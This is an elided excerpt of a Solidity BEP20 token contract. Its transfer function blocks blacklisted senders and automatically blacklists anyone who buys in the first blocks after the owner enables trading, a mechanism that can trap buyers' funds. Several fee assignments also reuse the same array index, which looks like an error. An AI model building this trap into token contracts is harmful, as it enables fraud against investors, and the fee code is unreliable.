...
contract BEP20 is Context, IERC20, Ownable {
    ...
    address[2] memory _WALLET) 
    {
        ...
        TokenOwner = address(0x6B9Ac22aa922F8A8674412585Ac4710d888cd811);
        _buyLiquidityFee = _BUYFEE[1];
        _buyMarketingFee = _BUYFEE[2];
        _buyTeamFee = _BUYFEE[2];

        _sellLiquidityFee = _SELLFEE[2];
        _sellMarketingFee = _SELLFEE[2];
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if(true){require(whoCantEat[sender] == false, "You Cant Eat!");}
        ...
        else
        {
            ...
            if (isExcludedFromCut[sender] || isExcludedFromCut[recipient]) {
                ...
                if(sender == uniswapPair) {require(nowIsEatingCake);
                    if (block.number < whenEat + cantEatCake) {                  
                        youCantEat(recipient);
                    }
                }
